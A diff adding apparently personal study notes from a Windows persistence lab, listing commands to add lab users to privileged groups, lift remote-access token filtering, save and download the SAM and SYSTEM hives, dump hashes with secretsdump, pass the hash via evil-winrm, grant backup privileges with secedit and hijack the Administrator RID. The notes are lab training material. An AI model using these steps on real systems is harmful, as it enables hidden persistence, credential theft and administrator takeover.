@@ -1,0 +1,64 @@
+- Using administrator account is great but sometimes, using it will alert the blue team. That's why it is good to use unprivileged account and grant administrator privilege.
+
+- Add thmuser0 to administrators group : 
+    - net localgroup administrators thmuser0 /add
+    - This allow to access the server via RDP, WinRM or any other administration service.
+
+- Add thmuser1 to "Backup Operators" group : 
+    - net localgroup "Backup Operators" thmuser1 /add
+    - If administrators looks too suspicious, use the backup operators group. This group doesn't have administrator privilege but can read/write any file in the system ignoring the DACL. 
+    - It can't use any administration service like RDP or WinRM. To allow this, add explicitely the user to 'Remote Desktop Users'(RDP) or 'Remote Management Users'(WinRM)
+        - C:\> net localgroup "Remote Management Users" thmuser1 /add
+        - Connect to the target using WinRM from the attacker machine : 
+            - evil-winrm -i 10.10.92.203 -u thmuser1 -p Password321
+        - Show the groups of the current user : 
+            - whoami /groups
+    - Even in this group, with remote connexion like RDP or WinRM, the group is disabled by default. To regain the access use the code : 
+        - reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+
+- Backdor the user : 
+    - after regaining access as administrator, backup the sam and system of the user : 
+        - reg save hklm\system system.bak
+        - reg save hklm\sam sam.bak
+    - Then upload it to the attacker machine by any way. For WInRM : 
+        - download system.bak
+        - download sam.bak
+    - After that, use secretsdup.py to dump the hashes of all users : 
+        - python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
+    - Finaly, use a pass the hash to connect to the victim machine with a Pass-the-hash to get administrator privileges : 
+        - evil-winrm -i 10.10.171.236 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
+
+- Special privileges : 
+    - Sometimes, there is no need to change the user's group. Some privileges are attributed by the users by default : 
+        - list of all special privileges : https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
+        - Exampes of special privileges : 
+            - SeBackupPrivilege : user can read any file in the system ignoring any DACL
+            - SeRestorePrivilege : user can write any file on the system ignoring any DACL
+    - To assign an user to these groups, use secedit :
+        - first, export thecurrent configuration to a temporary file :  
+            - secedit /export /cfg config.inf
+        - Add the user to the line of the desired privilege at the end of the line.
+        - Finaly, convert the .ing file into a .sbd file which is then used to load the configuration back into the system :    
+            - secedit /import /cfg config.inf /db config.sdb
+            - secedit /configure /db config.sdb /cfg config.inf
+        - These steps give the user the same privilege as if he was in the group "Backup Operators" but can't yet get a the permission on connexion.
+        - To allow the user to connect, add him to a group like "Remote Desktop Users' or any other like this like the last method or this new method : 
+            - Open the configuration window for WinRM : 
+                - Set-PSSessionConfiguration -Name Microsoft.PowerShell
+                - For the user to use the group : reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+                -showSecurityDescriptorUI
+            - Click on the user and then click on FUll COntrol(ALl Operations) 
+        - If the user have the proper privilege, the previous task can be reproduced.
+        - the default Administrator account has a RID = 500, while a ragular user have a RID >=1000
+        - See RID of users : 
+            - wmic useraccount get name,sid
+        - RID is the last bit og the SID. It allows the system to identify user across a domain
+        - To get administrator, just assing him a RID=500 : 
+            - First, access the SAM using Regedit:
+                - The SAM is only editable by the SYSTEM accound only so even the administrator won't be able to edit it.
+                - To run Regedit as SYSTEM, use psexec:
+                    - C:\tools\pstools\PsExec64.exe -i -s regedit
+                - In regedit, go to HKLM\SAM\SAM\Domains\Account\Users\ where there will be a key for each user in the machine. The folder name is a hex format of the user's RID : 
+                - Go to the value called F which holds the user's effective RID at position 0x30
+                - The bytes of the RID is reversed so a rid of 500 : 0X01F4 will be stored as F401.
+                - The next time the user will log in, LSASS will associate it with the same RID as Administrator and grant the same privileges.
